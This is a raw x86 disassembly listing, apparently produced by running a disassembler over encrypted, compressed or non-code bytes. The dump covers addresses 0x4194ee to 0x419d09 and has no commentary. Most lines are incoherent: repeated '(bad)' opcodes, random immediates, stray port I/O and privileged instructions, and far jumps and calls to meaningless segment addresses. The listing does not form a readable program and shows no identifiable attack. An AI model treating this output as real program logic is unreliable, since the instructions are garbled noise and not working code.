  4194ee:	leave  
  4194ef:	adc    DWORD PTR [edi-0x1d],0xc1f8fa67
  4194f6:	cmp    ch,cl
  4194f8:	and    ebp,DWORD PTR [eax+0x2a]
  4194fb:	mov    bh,BYTE PTR [eax+edi*2]
  4194fe:	adc    DWORD PTR [esi-0x6bbd0cfe],0xfc97cc04
  419508:	std    
  419509:	xchg   esi,eax
  41950a:	mov    ecx,0x62d7ac9e
  41950f:	test   eax,0xc9367c9e
  419514:	pop    ebx
  419515:	xor    BYTE PTR [ebx],dl
  419517:	sbb    al,0xf7
  419519:	sub    ebp,DWORD PTR [edi]
  41951b:	call   0x3826:0x390b20ac
  419522:	xchg   esp,eax
  419523:	cmp    DWORD PTR [ecx],edi
  419525:	inc    al
  419527:	push   di
  419529:	or     ah,bh
  41952b:	(bad)  
  41952c:	fs ret 
  41952e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952f:	sbb    BYTE PTR [eax+0x25426b22],0x2b
  419536:	add    edi,DWORD PTR [esi+0x6a77b7b]
  41953c:	ins    DWORD PTR es:[edi],dx
  41953d:	pop    ds
  41953e:	mov    ah,0x27
  419540:	sub    DWORD PTR [edi+0x312bd6b9],0x1c0d0595
  41954a:	int    0x48
  41954c:	(bad)  [edx+0x14]
  41954f:	xlat   BYTE PTR ds:[ebx]
  419550:	jbe    0x4194f6
  419552:	lods   eax,DWORD PTR ds:[esi]
  419553:	arpl   WORD PTR ds:0xbefbfa8c,di
  419559:	cld    
  41955a:	test   eax,0x1b5763bb
  41955f:	xchg   DWORD PTR [edx+0x745a6ef0],ebp
  419565:	repz fsubr st,st(6)
  419568:	mul    DWORD PTR [edi+0x1253ee98]
  41956e:	rcr    bl,0x72
  419571:	jp     0x41959b
  419573:	inc    ebp
  419574:	push   edx
  419575:	mov    ebp,0xfee79211
  41957a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41957b:	or     ch,BYTE PTR [esi+eiz*1-0x11]
  41957f:	pop    esp
  419580:	nop
  419581:	dec    ebp
  419582:	jmp    0xaf22:0x72f978ba
  419589:	adc    al,0xaa
  41958b:	adc    esi,DWORD PTR [ebp+0x52a5d99e]
  419591:	push   es
  419592:	mov    DWORD PTR [ebx],esi
  419594:	mov    ebp,0x5b617042
  419599:	into   
  41959a:	mov    bl,0xcd
  41959c:	sbb    DWORD PTR [esi+0x53],esi
  41959f:	cmp    bl,BYTE PTR [ecx+0x4b464810]
  4195a5:	test   esp,0xe6a50b08
  4195ab:	dec    ecx
  4195ac:	sub    DWORD PTR [ebx],0xffffffd1
  4195af:	neg    BYTE PTR [ebx]
  4195b1:	mov    ecx,0xc84ff9df
  4195b6:	xor    eax,0x4c2dd32b
  4195bb:	ror    DWORD PTR [eax+0x517d7c19],1
  4195c1:	clc    
  4195c2:	pop    esp
  4195c3:	jae    0x419594
  4195c5:	(bad)  
  4195c6:	pop    ebp
  4195c7:	inc    edi
  4195c8:	mov    ds:0x92ef9ec,al
  4195cd:	int    0xff
  4195cf:	call   0x8264e3ea
  4195d4:	dec    ebx
  4195d5:	xor    edi,eax
  4195d7:	cli    
  4195d8:	test   al,0x7d
  4195da:	outs   dx,BYTE PTR ds:[esi]
  4195db:	cmp    BYTE PTR ds:0xaed3749d,cl
  4195e1:	aad    0xfc
  4195e3:	mov    bl,0x1c
  4195e5:	mov    al,0x6
  4195e7:	dec    edi
  4195e8:	mov    BYTE PTR [eax],0x64
  4195eb:	aaa    
  4195ec:	mov    esi,0xd3355962
  4195f1:	or     dh,BYTE PTR ds:[ebx]
  4195f4:	leave  
  4195f5:	dec    ebx
  4195f6:	push   0x3e49354b
  4195fb:	cmc    
  4195fc:	adc    eax,0xa96d42dc
  419601:	(bad)  
  419602:	or     eax,0x2b538afd
  419607:	xor    DWORD PTR [edi-0x6],ecx
  41960a:	or     bh,BYTE PTR [esi+esi*8-0x5b]
  41960e:	xor    BYTE PTR [eax+0x1cf53f96],dh
  419614:	stos   DWORD PTR es:[edi],eax
  419615:	sub    ch,BYTE PTR [eax+0x4f]
  419618:	repnz ficomp WORD PTR [ebx+0x5c2c9315]
  41961f:	jg     0x419656
  419621:	mov    dh,0xe7
  419623:	and    BYTE PTR [ebx-0x104e2b1d],bh
  419629:	dec    eax
  41962a:	adc    ebp,esi
  41962c:	clc    
  41962d:	(bad)  
  41962e:	retf   0x3cb9
  419631:	lahf   
  419632:	dec    esi
  419633:	imul   esi,DWORD PTR [ecx+eax*8-0x49a360c6],0xffffff99
  41963b:	sbb    DWORD PTR [edx+0x13708780],eax
  419641:	js     0x419620
  419643:	cmc    
  419644:	pop    ebx
  419645:	jge    0x419614
  419647:	dec    eax
  419648:	sub    BYTE PTR [ebx-0x4e],ah
  41964b:	daa    
  41964c:	call   0x4fe7262a
  419651:	mov    ah,0xb2
  419653:	xchg   esi,eax
  419654:	(bad)  
  419655:	sub    eax,DWORD PTR [eax+edi*2]
  419658:	push   0xffffff8c
  41965a:	push   es
  41965b:	das    
  41965c:	dec    ebx
  41965d:	xor    ah,bl
  41965f:	(bad)  
  419660:	pop    ecx
  419661:	shl    DWORD PTR [eax+0x25ce4c31],cl
  419667:	ins    DWORD PTR es:[edi],dx
  419668:	mov    ebp,0x14cd9d3d
  41966d:	mov    eax,ds:0xdddd4d70
  419672:	adc    eax,0x8767394d
  419677:	jmp    0xc37c:0xe32c267
  41967e:	les    esp,FWORD PTR [eax+edi*8-0x7]
  419682:	inc    edi
  419683:	rol    BYTE PTR [esi*4-0x5f9e1afa],cl
  41968a:	shl    DWORD PTR [ebp-0x36],1
  41968d:	repz pop esp
  41968f:	(bad)  
  419690:	out    dx,al
  419691:	ficomp DWORD PTR ds:0x3d7a9043
  419697:	cmp    eax,0x7cca52b9
  41969c:	out    0x94,eax
  41969e:	popf   
  41969f:	gs (bad) 
  4196a4:	call   0x198f2e65
  4196a9:	and    ch,BYTE PTR [ebp+0x1a]
  4196ac:	push   edi
  4196ad:	and    al,0x2a
  4196af:	in     al,dx
  4196b0:	cmp    BYTE PTR ds:[eax-0x62],dh
  4196b4:	jns    0x4196ee
  4196b6:	or     DWORD PTR [edi],ebp
  4196b8:	loop   0x41968d
  4196ba:	sub    al,bh
  4196bc:	fild   WORD PTR [edi+eiz*8]
  4196bf:	stos   BYTE PTR es:[edi],al
  4196c0:	mov    BYTE PTR [edx-0x38],bh
  4196c3:	neg    BYTE PTR ds:0x8190f52c
  4196c9:	in     al,0x48
  4196cb:	inc    esp
  4196cc:	fimul  WORD PTR [ebp+0x525bad0f]
  4196d2:	call   0x3e74:0xbaa215
  4196d9:	aaa    
  4196da:	je     0x4196f0
  4196dc:	push   ecx
  4196dd:	(bad)  
  4196de:	pop    ebp
  4196df:	xchg   ebp,eax
  4196e0:	pop    edx
  4196e1:	ror    dh,cl
  4196e3:	test   al,0x84
  4196e5:	int    0x6f
  4196e7:	jle    0x419693
  4196e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ea:	pop    ecx
  4196eb:	xor    DWORD PTR [edx+0x73],edx
  4196ee:	adc    eax,DWORD PTR [edi+ecx*1]
  4196f1:	fldenv [ebx+ebp*2]
  4196f4:	cmp    al,0xb8
  4196f6:	push   esi
  4196f7:	outs   dx,DWORD PTR ds:[esi]
  4196f8:	or     BYTE PTR [ecx],dl
  4196fa:	add    edi,eax
  4196fc:	cmp    DWORD PTR [ebx-0x56],ecx
  4196ff:	jp     0x419719
  419701:	push   0xec0058aa
  419706:	sub    BYTE PTR [ecx-0x3014924a],ch
  41970c:	fsubr  DWORD PTR [eax]
  41970e:	mov    ds:0xe5c304f5,al
  419713:	mov    dh,0x7
  419715:	mov    dl,0x28
  419717:	neg    BYTE PTR [edx+0x57]
  41971a:	sub    dh,BYTE PTR [ecx+0x6f]
  41971d:	test   BYTE PTR [edi+0x72e5a514],bh
  419723:	mov    esi,ebp
  419725:	mov    edx,0xf27858e8
  41972a:	sub    BYTE PTR [eax],dh
  41972c:	mov    BYTE PTR [ecx],0xac
  41972f:	sbb    ebp,edi
  419731:	(bad)  
  419732:	icebp  
  419733:	add    bh,BYTE PTR [edi-0x55abf054]
  419739:	cmp    DWORD PTR [ebx+esi*1-0x1c4c4e63],0xd5b8e2f0
  419744:	inc    ebx
  419745:	mov    edi,0x6b0d3a0b
  41974a:	push   edx
  41974b:	daa    
  41974c:	aaa    
  41974d:	mov    esi,0xd27feb83
  419752:	sub    ebp,DWORD PTR [ebx-0x246fc77a]
  419758:	(bad)  
  419759:	sbb    al,0x68
  41975b:	retf   0x36b7
  41975e:	inc    eax
  41975f:	loop   0x419710
  419761:	cmp    BYTE PTR [ecx-0x35],dh
  419764:	retf   0x4cb6
  419767:	fs push ecx
  419769:	or     BYTE PTR [ebx-0x80],ah
  41976c:	mov    eax,0x11c4abeb
  419771:	imul   ebx,DWORD PTR [esi-0x1a],0xffffffa9
  419775:	mov    dh,0xd3
  419777:	and    al,ch
  419779:	inc    ebp
  41977a:	ret    
  41977b:	ret    
  41977c:	push   esp
  41977d:	adc    eax,0x2fc96e7
  419782:	nop
  419783:	xchg   ecx,eax
  419784:	sub    bh,al
  419786:	lods   eax,DWORD PTR ds:[esi]
  419787:	test   BYTE PTR [esi+0x29bce6ce],al
  41978d:	pop    esp
  41978e:	mov    esp,0x6d38315e
  419793:	in     eax,dx
  419794:	lahf   
  419795:	test   eax,0x57fe03ca
  41979a:	out    dx,al
  41979b:	dec    ecx
  41979c:	xchg   esp,eax
  41979d:	aad    0x8
  41979f:	jmp    0xa895:0x98cb7d48
  4197a6:	add    al,0xc3
  4197a8:	call   0xa604:0x1b219645
  4197af:	loope  0x4197a6
  4197b1:	ds xor cl,bh
  4197b4:	pop    edi
  4197b5:	push   ecx
  4197b6:	inc    esp
  4197b7:	mov    cl,0x16
  4197b9:	dec    ebx
  4197ba:	mov    DWORD PTR [edx-0x3d],edi
  4197bd:	push   esi
  4197be:	xor    DWORD PTR [edi],ebx
  4197c0:	loop   0x4197ad
  4197c2:	inc    eax
  4197c3:	jmp    0x69b9:0x175d75d4
  4197ca:	out    dx,al
  4197cb:	or     DWORD PTR [esi+0x7b],ebx
  4197ce:	nop
  4197cf:	into   
  4197d0:	xor    eax,0x4895835d
  4197d5:	sub    eax,0x94a77704
  4197da:	mov    bl,0x8b
  4197dc:	jecxz  0x4197f4
  4197de:	lds    ecx,FWORD PTR [eax+0x28e2e7f3]
  4197e4:	push   cs
  4197e5:	push   0x683ba32f
  4197ea:	sahf   
  4197eb:	mov    bh,cl
  4197ed:	add    eax,0x68a63d7e
  4197f2:	data16 loop 0x419832
  4197f5:	popa   
  4197f6:	push   eax
  4197f7:	jb     0x419853
  4197f9:	aam    0x44
  4197fb:	pop    eax
  4197fc:	add    DWORD PTR [ebx+0x4db8d1fc],edi
  419802:	inc    eax
  419803:	(bad)  
  419804:	mov    ecx,0xddca723
  419809:	push   edx
  41980a:	sbb    DWORD PTR [edx+0x58],esi
  41980d:	sbb    eax,0x29baa51f
  419812:	fwait
  419813:	dec    edx
  419814:	push   ds
  419815:	and    DWORD PTR [ecx+0x7],ebp
  419818:	das    
  419819:	xor    bh,BYTE PTR [eax+0x41]
  41981c:	mov    ch,0x5f
  41981e:	popa   
  41981f:	cmp    al,0x4
  419821:	jbe    0x4197b7
  419823:	jl     0x4197e0
  419825:	jmp    FWORD PTR [ecx+eax*2+0x57]
  419829:	push   0x7
  41982b:	scas   eax,DWORD PTR es:[edi]
  41982c:	data16 (bad) 
  41982f:	ret    0x206d
  419832:	sbb    eax,0xad4eae41
  419837:	fst    QWORD PTR [edi+ecx*8]
  41983a:	push   0xffffff81
  41983c:	icebp  
  41983d:	ret    
  41983e:	(bad)  
  41983f:	jbe    0x41981c
  419841:	xchg   edx,eax
  419842:	mov    bl,0xb4
  419844:	fld    TBYTE PTR [eax]
  419846:	or     al,0x3b
  419848:	or     eax,edi
  41984a:	inc    edx
  41984b:	(bad)  
  41984c:	(bad)  
  41984d:	mov    dl,0x8a
  41984f:	mov    dh,0x38
  419851:	retf   
  419852:	retf   
  419853:	leave  
  419854:	sar    BYTE PTR [ecx],0xa7
  419857:	out    dx,al
  419858:	xor    eax,0x8627b7b4
  41985d:	xchg   esi,eax
  41985e:	mov    edx,0xc0ed544f
  419863:	rol    DWORD PTR [ebx+0x79],cl
  419866:	icebp  
  419867:	repz aam 0x68
  41986a:	cwde   
  41986b:	sbb    al,BYTE PTR [ebx-0x36]
  41986e:	call   0x4fa2:0x3ffb33fb
  419875:	cld    
  419876:	mov    cl,0x88
  419878:	clc    
  419879:	or     al,0xa6
  41987b:	mov    BYTE PTR [edi-0x20],al
  41987e:	gs ret 0x8c31
  419882:	add    dh,BYTE PTR [edx+eiz*1-0x44]
  419886:	call   DWORD PTR ds:0xc930c414
  41988c:	dec    esi
  41988d:	add    DWORD PTR [ecx],edi
  41988f:	pop    ds
  419890:	sub    eax,0x40431d2f
  419895:	adc    eax,0x377d7bb2
  41989a:	or     ecx,DWORD PTR [ebp+eax*4-0x2f]
  41989e:	xlat   BYTE PTR es:[ebx]
  4198a0:	jo     0x4198c0
  4198a2:	inc    ecx
  4198a3:	mov    al,0x84
  4198a5:	(bad)  [ecx-0x4d]
  4198a8:	lods   al,BYTE PTR ds:[esi]
  4198a9:	xor    DWORD PTR [ebx-0x1ab8bf83],0x886693
  4198b3:	repz and BYTE PTR [eax-0x3e9deb59],dl
  4198ba:	adc    dl,BYTE PTR [ecx+ebx*2-0x380f6b05]
  4198c1:	jmp    0x55bb94bd
  4198c6:	mov    ?,WORD PTR [edi-0x41]
  4198c9:	hlt    
  4198ca:	aad    0xac
  4198cc:	das    
  4198cd:	or     al,dh
  4198cf:	into   
  4198d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d1:	(bad)  
  4198d2:	test   BYTE PTR [ebx],al
  4198d4:	dec    edx
  4198d5:	out    0x3e,eax
  4198d7:	cmp    eax,0xd3889037
  4198dc:	or     ecx,DWORD PTR [ecx-0x745d2382]
  4198e2:	mov    bl,0x3
  4198e4:	pop    eax
  4198e5:	addr16 in eax,dx
  4198e7:	add    eax,0xa4366d6a
  4198ec:	xlat   BYTE PTR ds:[ebx]
  4198ed:	xchg   ebp,eax
  4198ee:	mov    al,0xa2
  4198f0:	ror    ebp,0xa
  4198f3:	or     BYTE PTR [ecx],bh
  4198f5:	punpcklwd mm7,DWORD PTR [esi+0x451f28e8]
  4198fc:	(bad)
  4198ff:	sub    edi,DWORD PTR [edx+0x78]
  419902:	xor    edi,esi
  419904:	xchg   ecx,eax
  419905:	out    dx,eax
  419906:	out    dx,al
  419907:	retf   
  419908:	ds pushf 
  41990a:	sar    DWORD PTR [ebx],cl
  41990c:	jp     0x4198ea
  41990e:	fidiv  DWORD PTR [ecx-0x1c]
  419911:	(bad)  
  419912:	cwde   
  419913:	lahf   
  419914:	in     al,dx
  419915:	sub    ebp,ecx
  419917:	cmp    DWORD PTR [ebx+0x5b346c6],edx
  41991d:	jge    0x4198b1
  41991f:	lahf   
  419920:	push   ebp
  419921:	mov    eax,0x23562ad
  419926:	jnp    0x419931
  419928:	imul   edi,DWORD PTR [ecx],0x21a7f560
  41992e:	(bad)  
  419930:	retf   
  419931:	push   ss
  419932:	fisttp WORD PTR [edx-0x3770db1f]
  419938:	adc    DWORD PTR [eax-0x5e2aa715],esp
  41993e:	xchg   edi,eax
  41993f:	retf   0x6bfd
  419942:	xor    BYTE PTR [ebx],bl
  419944:	sahf   
  419945:	dec    ecx
  419946:	clc    
  419947:	mov    eax,ds:0x232c3542
  41994c:	sbb    BYTE PTR [edx+0x4c809b48],0x54
  419953:	es (bad) 
  419955:	jns    0x41996e
  419957:	inc    ecx
  419958:	out    dx,al
  419959:	lock imul edx,DWORD PTR es:[edi-0x72663349],0xdf214829
  419965:	ja     0x419903
  419967:	push   ss
  419968:	adc    DWORD PTR [ebx+esi*2],0x71
  41996c:	daa    
  41996d:	pop    esp
  41996e:	leave  
  41996f:	or     DWORD PTR [eax+0x1d],ecx
  419972:	sbb    eax,0x23a347f
  419977:	test   dh,bh
  419979:	aad    0xed
  41997b:	inc    ebx
  41997c:	mov    esi,0x71c5a20b
  419981:	sub    al,0xa5
  419983:	pop    ebp
  419984:	push   0x7c
  419986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419987:	or     al,0x21
  419989:	add    al,0xd4
  41998b:	push   eax
  41998c:	dec    ecx
  41998d:	push   ebp
  41998e:	cmp    cl,al
  419990:	mov    bh,0xd9
  419992:	int3   
  419993:	jge    0x419974
  419995:	dec    eax
  419996:	push   eax
  419997:	pushf  
  419998:	xor    ebp,DWORD PTR [ebp+0x747e7cf7]
  41999e:	jnp    0x419946
  4199a0:	(bad)  
  4199a2:	rol    edx,cl
  4199a4:	push   ebx
  4199a5:	ds in  eax,0x24
  4199a8:	daa    
  4199a9:	adc    DWORD PTR [ecx+0x36],ebx
  4199ac:	add    al,0xe8
  4199ae:	cld    
  4199af:	jbe    0x41993c
  4199b1:	pop    eax
  4199b2:	pop    esi
  4199b3:	sti    
  4199b4:	ss in  al,dx
  4199b6:	adc    bh,BYTE PTR [edi-0x7e]
  4199b9:	jbe    0x419a05
  4199bb:	pop    ecx
  4199bc:	lahf   
  4199bd:	(bad)  
  4199be:	jp     0x419961
  4199c0:	std    
  4199c1:	mov    al,0xf8
  4199c3:	pop    ebx
  4199c4:	fsubrp st(7),st
  4199c6:	jecxz  0x4199ae
  4199c8:	enter  0x25e1,0xfa
  4199cc:	aam    0xbd
  4199ce:	mov    esi,0x14a80606
  4199d3:	bound  esp,QWORD PTR [ebp+0x74]
  4199d6:	ja     0x4199e4
  4199d8:	sbb    DWORD PTR [ecx+0x41a03bc6],ecx
  4199de:	shld   DWORD PTR [ecx],ebp,cl
  4199e1:	and    ebp,DWORD PTR [edi-0x78]
  4199e4:	add    al,0x58
  4199e6:	lea    edx,ds:0xf109b40b
  4199ec:	or     DWORD PTR [ebp+0x4c],ecx
  4199ef:	cwde   
  4199f0:	mov    dh,0x4b
  4199f2:	xchg   BYTE PTR [edx+0x122b87fb],bh
  4199f8:	hlt    
  4199f9:	ret    
  4199fa:	outs   dx,DWORD PTR ds:[esi]
  4199fb:	mov    ebx,0xcbb7e35e
  419a00:	aas    
  419a01:	mov    edx,0x5b72e228
  419a06:	inc    DWORD PTR [ebp-0x73de5c7e]
  419a0c:	test   eax,0x8a783d59
  419a11:	xchg   DWORD PTR [esi],edx
  419a13:	aad    0x28
  419a15:	inc    edx
  419a16:	and    ebp,DWORD PTR [esi+esi*8+0x7d32e0c]
  419a1d:	jmp    DWORD PTR [esi+0x36]
  419a20:	sbb    eax,0x39147dfc
  419a25:	cmp    al,0x12
  419a27:	mov    ebp,0xdf9e238b
  419a2c:	add    eax,DWORD PTR [eax+ebx*2]
  419a2f:	not    BYTE PTR [ebx+0x32]
  419a32:	fcmovu st,st(6)
  419a34:	lock or al,0xe2
  419a37:	push   eax
  419a38:	bound  edi,QWORD PTR [edx]
  419a3a:	mov    esi,0xfe2dc555
  419a3f:	ss mov ch,0x8d
  419a42:	jnp    0x419a5c
  419a44:	dec    eax
  419a45:	inc    esi
  419a46:	(bad)  
  419a47:	repz push eax
  419a49:	(bad)  
  419a4a:	enter  0x769a,0xd2
  419a4e:	jl     0x419a1a
  419a50:	hlt    
  419a51:	(bad)  
  419a52:	cmp    al,0x26
  419a54:	mov    ecx,0xb5712c15
  419a59:	sub    al,bl
  419a5b:	daa    
  419a5c:	mov    ds:0x435c0981,eax
  419a61:	sbb    eax,0x64e029cf
  419a66:	shl    BYTE PTR [ebp+0x52aec7b3],0xf0
  419a6d:	add    al,0xe6
  419a6f:	jno    0x419a0b
  419a71:	add    al,ah
  419a73:	jnp    0x419a0a
  419a75:	xchg   ecx,eax
  419a76:	jo     0x419af0
  419a78:	xor    al,0x5c
  419a7a:	js     0x419a0e
  419a7c:	cli    
  419a7d:	mov    ebp,0x80ba7e09
  419a82:	mov    esi,esi
  419a84:	repnz out dx,eax
  419a86:	test   eax,0x6519f3d0
  419a8b:	jle    0x419acc
  419a8d:	cdq    
  419a8e:	pushf  
  419a8f:	mov    al,ds:0xdde54459
  419a94:	daa    
  419a95:	mov    ah,0x8f
  419a97:	out    0x63,eax
  419a99:	(bad)  
  419a9a:	adc    BYTE PTR [eax+0x7],dl
  419a9d:	or     ch,dl
  419a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aa0:	inc    edi
  419aa1:	out    0xe4,eax
  419aa3:	add    al,0xbc
  419aa5:	sbb    DWORD PTR [edi+eax*1-0x2203086e],edx
  419aac:	sub    ebp,eax
  419aae:	sub    edi,DWORD PTR [ebx]
  419ab0:	unpckhps xmm6,XMMWORD PTR [esi+0x1c96617e]
  419ab7:	xchg   ecx,ecx
  419ab9:	lds    eax,FWORD PTR [ecx]
  419abb:	(bad)  
  419abc:	adc    edi,DWORD PTR [esi-0x46]
  419abf:	leave  
  419ac0:	(bad)  
  419ac1:	lahf   
  419ac2:	mov    ebp,0xa6474b12
  419ac7:	rol    ebx,0x0
  419aca:	sbb    bl,BYTE PTR [ebp+0x3406cbec]
  419ad0:	mov    ch,0x2c
  419ad2:	mov    esp,0xeb8067de
  419ad7:	test   eax,0xe855c0ed
  419adc:	and    eax,ebp
  419ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419adf:	rcl    bh,cl
  419ae1:	or     DWORD PTR [esi+0x7d825661],esp
  419ae7:	push   cs
  419ae8:	and    al,0x60
  419aea:	ret    
  419aeb:	popf   
  419aec:	hlt    
  419aed:	sub    DWORD PTR [eax-0x5a601f90],esi
  419af3:	push   esp
  419af4:	jnp    0x419b5a
  419af6:	test   BYTE PTR ds:0x94ac0f50,al
  419afc:	push   ss
  419afd:	adc    al,0x81
  419aff:	fild   DWORD PTR [edx]
  419b01:	push   ebp
  419b02:	mov    bl,BYTE PTR [esi-0x25]
  419b05:	mov    dl,0x10
  419b07:	call   0x5e39b0f5
  419b0c:	enter  0x3c6f,0x2a
  419b10:	cwde   
  419b11:	sbb    DWORD PTR [edi+0x5442404d],esi
  419b17:	cmp    bh,BYTE PTR ds:0x80812fff
  419b1d:	test   eax,0x647a18fd
  419b22:	inc    ebx
  419b23:	add    eax,edx
  419b25:	xor    eax,0x7dacfb0d
  419b2a:	jno    0x419aac
  419b2c:	or     edi,edi
  419b2e:	mov    ds:0x3abf3f8b,eax
  419b33:	(bad)  
  419b34:	dec    esi
  419b35:	in     eax,dx
  419b36:	gs lock nop
  419b39:	(bad)  
  419b3a:	dec    edx
  419b3b:	aaa    
  419b3c:	add    DWORD PTR [edi],ebx
  419b3e:	mov    BYTE PTR [eax-0x6a958d29],ah
  419b44:	dec    esp
  419b45:	pop    es
  419b46:	fist   WORD PTR [ebx+0x34]
  419b49:	xchg   BYTE PTR [ecx],bh
  419b4b:	mov    ecx,edx
  419b4d:	lock outs dx,BYTE PTR ds:[esi]
  419b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b50:	adc    al,0xa1
  419b52:	call   0xc36:0xeefba5b
  419b59:	pop    esp
  419b5a:	inc    ecx
  419b5b:	sub    eax,0x977d1076
  419b60:	loopne 0x419b3e
  419b62:	pop    ebp
  419b63:	inc    ecx
  419b64:	adc    esp,DWORD PTR [ebp+0x45ba99b9]
  419b6a:	push   ecx
  419b6b:	ror    BYTE PTR [ebx],1
  419b6d:	sbb    BYTE PTR [ebp-0x30],dl
  419b70:	and    BYTE PTR [ecx+0x315a5d35],0xd3
  419b77:	xchg   edx,eax
  419b78:	pushf  
  419b79:	fnstcw WORD PTR [edi+0x36125e14]
  419b7f:	stos   BYTE PTR es:[edi],al
  419b80:	out    0x7f,al
  419b82:	push   cs
  419b83:	mov    bl,0x77
  419b85:	(bad)  
  419b87:	xor    eax,0x64bffa1b
  419b8c:	jnp    0x419b42
  419b8e:	outs   dx,DWORD PTR ds:[esi]
  419b8f:	test   al,0xce
  419b91:	mov    ds:0xb06cca27,al
  419b96:	adc    al,0xc4
  419b98:	jne    0x419b72
  419b9a:	fsubr  st(4),st
  419b9c:	mov    dh,0x3b
  419b9e:	add    al,0x5
  419ba0:	mov    esp,0x1c284459
  419ba5:	cmp    eax,0xd710557b
  419baa:	adc    al,ch
  419bac:	mov    WORD PTR [ecx-0x21],ds
  419baf:	mov    edx,0xde159fa5
  419bb4:	push   ecx
  419bb5:	ds push ebx
  419bb7:	loope  0x419bfe
  419bb9:	adc    BYTE PTR [ebx-0x32188946],0xa5
  419bc0:	test   al,0x46
  419bc2:	inc    ebx
  419bc3:	xor    ecx,DWORD PTR [ebx]
  419bc5:	mov    BYTE PTR [eax+0x43],al
  419bc8:	jno    0x419c37
  419bca:	and    eax,0x7ea6cfa7
  419bcf:	js     0x419c26
  419bd1:	test   al,0xc1
  419bd3:	dec    esp
  419bd4:	dec    eax
  419bd5:	and    bl,BYTE PTR [eax+0x72]
  419bd8:	xchg   edx,eax
  419bd9:	xchg   BYTE PTR [ecx-0x44c0e606],bh
  419bdf:	lahf   
  419be0:	sbb    dh,BYTE PTR [ecx+ecx*4]
  419be3:	dec    ebp
  419be4:	(bad)  
  419be5:	xlat   BYTE PTR ds:[ebx]
  419be6:	aaa    
  419be7:	sar    BYTE PTR [edx+0x2551310c],cl
  419bed:	fwait
  419bee:	adc    BYTE PTR [ecx+0x65],cl
  419bf1:	shl    BYTE PTR [ebp+0x74],0x90
  419bf5:	cs mov ah,0xee
  419bf8:	lds    esi,FWORD PTR [eax+0x11]
  419bfb:	xor    esp,DWORD PTR [eax]
  419bfd:	(bad)  
  419bfe:	jnp    0x419bd2
  419c00:	cwde   
  419c01:	cwde   
  419c02:	out    0xde,eax
  419c04:	and    al,0xab
  419c06:	retf   0x7552
  419c09:	inc    ecx
  419c0a:	je     0x419bd8
  419c0c:	mov    esp,DWORD PTR [eax+0x64874486]
  419c12:	test   al,0x5c
  419c14:	cdq    
  419c15:	and    edi,edx
  419c17:	pusha  
  419c18:	mov    ah,0x8
  419c1a:	sbb    al,0x2b
  419c1c:	rol    eax,1
  419c1e:	fimul  WORD PTR [eax-0x49ef1064]
  419c24:	ror    DWORD PTR [eax+eax*1+0x5b70186d],1
  419c2b:	aas    
  419c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c2d:	sahf   
  419c2e:	jecxz  0x419c36
  419c30:	adc    al,0x36
  419c32:	icebp  
  419c33:	leave  
  419c34:	hlt    
  419c35:	cdq    
  419c36:	sub    al,BYTE PTR [ecx-0x80]
  419c39:	test   al,0x60
  419c3b:	or     al,0x6d
  419c3d:	or     al,0xb8
  419c3f:	push   eax
  419c40:	or     DWORD PTR [edi],ecx
  419c42:	sub    eax,edi
  419c44:	pop    ebp
  419c45:	js     0x419bef
  419c47:	push   edx
  419c48:	xchg   dx,ax
  419c4a:	idiv   DWORD PTR [esi+0x68]
  419c4d:	xor    al,0x29
  419c4f:	sti    
  419c50:	sti    
  419c51:	inc    edx
  419c52:	push   es
  419c53:	mov    edx,0x9ce0fdd1
  419c58:	mov    al,0xeb
  419c5a:	cmp    eax,ebx
  419c5c:	loopne 0x419c4f
  419c5e:	mov    BYTE PTR [edi+0x3c],ch
  419c61:	ret    
  419c62:	(bad)  
  419c63:	daa    
  419c64:	lea    edx,[eax+0x66631f32]
  419c6a:	pop    eax
  419c6b:	jae    0x419c4d
  419c6d:	scas   eax,DWORD PTR es:[edi]
  419c6e:	or     edi,DWORD PTR [edi]
  419c70:	jns    0x419c14
  419c72:	mov    dl,0xd
  419c74:	mov    ch,0x63
  419c76:	(bad)  [eax-0x348f06a8]
  419c7c:	test   eax,0x1ab81474
  419c81:	jp     0x419c2d
  419c83:	mov    esi,0xe7ab1ddc
  419c88:	xchg   BYTE PTR [edx-0x2f6a6afe],ch
  419c8e:	mov    bh,0x2d
  419c90:	ins    BYTE PTR es:[edi],dx
  419c91:	add    BYTE PTR [esi+edi*2-0x74ec94cd],0x23
  419c99:	icebp  
  419c9a:	ins    BYTE PTR es:[edi],dx
  419c9b:	aad    0xac
  419c9d:	push   eax
  419c9e:	adc    eax,0xd366e2e4
  419ca3:	imul   eax,DWORD PTR [esi-0x74e5bba7],0x14
  419caa:	push   es
  419cab:	pop    ecx
  419cac:	inc    ecx
  419cad:	mov    cl,0xf2
  419caf:	sub    esi,DWORD PTR [eax+0x6b698fe1]
  419cb5:	iret   
  419cb6:	lock cmp dl,bl
  419cb9:	mov    dl,0xd7
  419cbb:	ja     0x419d33
  419cbd:	or     ebp,ebx
  419cbf:	adc    ch,BYTE PTR [edx]
  419cc1:	in     eax,0xe5
  419cc3:	cmp    eax,0x72937b63
  419cc8:	mov    edx,0xd0d52b8c
  419ccd:	stc    
  419cce:	cmp    ebp,DWORD PTR [edi]
  419cd0:	test   eax,0x9efae82b
  419cd5:	mov    al,ds:0x36ae7347
  419cda:	sbb    esi,DWORD PTR [edx]
  419cdc:	dec    ebx
  419cdd:	jae    0x419d06
  419cdf:	pop    ebp
  419ce0:	add    al,dh
  419ce2:	xor    eax,0xbbbb1bd9
  419ce7:	ret    
  419ce8:	adc    al,0xc5
  419cea:	les    ecx,FWORD PTR ds:0xfd249d11
  419cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cf1:	inc    eax
  419cf2:	or     al,0x64
  419cf4:	scas   al,BYTE PTR es:[edi]
  419cf5:	push   edx
  419cf6:	or     BYTE PTR [ebx+0x2bfccfff],0x90
  419cfd:	ds xchg ebp,eax
  419cff:	hlt    
  419d00:	sub    al,BYTE PTR [ebp+0x29]
  419d03:	push   ebp
  419d04:	je     0x419d25
  419d06:	ret    0xddc
  419d09:	daa    
